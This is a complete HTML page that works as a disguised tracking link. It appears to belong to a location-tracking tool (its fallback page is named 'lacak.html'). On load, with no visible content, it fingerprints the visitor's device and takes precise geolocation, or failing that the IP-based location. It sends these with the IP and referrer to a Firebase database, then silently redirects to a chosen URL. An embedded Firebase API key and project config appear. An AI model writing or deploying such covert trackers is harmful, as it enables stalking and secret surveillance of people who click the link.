<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
  <script>
    // Initialize Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyBclCbI9SudcBc6BR17Un8SNWTdzpGl29g",
      authDomain: "jarsi-df353.firebaseapp.com",
      databaseURL: "https://jarsi-df353-default-rtdb.firebaseio.com",
      projectId: "jarsi-df353",
      storageBucket: "jarsi-df353.appspot.com",
      messagingSenderId: "488797085147",
      appId: "1:488797085147:web:52108c710556a39f62dbfe"
    };
    
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Get URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const target = urlParams.get('target');
    const id = urlParams.get('id');

    // Redirect if missing params
    if (!target || !id) {
      window.location.href = 'lacak.html';
    } else {
      // Generate device fingerprint
      const generateDeviceId = () => {
        const info = navigator.userAgent + navigator.platform + navigator.language + 
                     window.screen.width + window.screen.height;
        let hash = 0;
        for (let i = 0; i < info.length; i++) {
          hash = (hash << 5) - hash + info.charCodeAt(i);
          hash |= 0;
        }
        return hash.toString();
      };

      // Create basic log data
      const logData = {
        id,
        target,
        timestamp: new Date().toISOString(),
        referrer: document.referrer || 'Direct',
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        deviceId: generateDeviceId()
      };

      // Try to get precise geolocation first
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            // Success - use precise coordinates
            logData.latitude = position.coords.latitude;
            logData.longitude = position.coords.longitude;
            logData.locationSource = 'geolocation';
            saveAndRedirect(logData, target);
          },
          (error) => {
            // Fallback to IP-based location
            getIPLocation(logData, target);
          },
          { timeout: 1000 } // Don't wait too long
        );
      } else {
        // Geolocation not available - use IP-based location
        getIPLocation(logData, target);
      }
    }

    function getIPLocation(logData, target) {
      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
          // Add IP data to log
          logData.ip = ipData.ip || 'Unknown';
          logData.city = ipData.city || 'Unknown';
          logData.region = ipData.region || 'Unknown';
          logData.country = ipData.country_name || 'Unknown';
          logData.latitude = ipData.latitude || 0;
          logData.longitude = ipData.longitude || 0;
          logData.locationSource = 'ipapi';
          
          saveAndRedirect(logData, target);
        })
        .catch(error => {
          console.error('Error getting IP data:', error);
          // Save without location data
          logData.ip = 'Unknown';
          logData.locationSource = 'none';
          saveAndRedirect(logData, target);
        });
    }

    function saveAndRedirect(logData, targetUrl) {
      // Generate unique log key
      const logKey = `${logData.id}_${new Date().getTime()}`;
      
      // Save to Firebase
      database.ref('logs/' + logKey).set(logData)
        .then(() => {
          // Prepare target URL
          let finalUrl = targetUrl;
          if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
            finalUrl = 'https://' + finalUrl;
          }
          
          // Redirect silently
          window.location.href = finalUrl;
        })
        .catch(error => {
          console.error('Error saving log:', error);
          // Still redirect even if logging failed
          window.location.href = targetUrl;
        });
    }
  </script>
</head>
<body>
<!-- No visible content - silent redirect -->
</body>
</html>
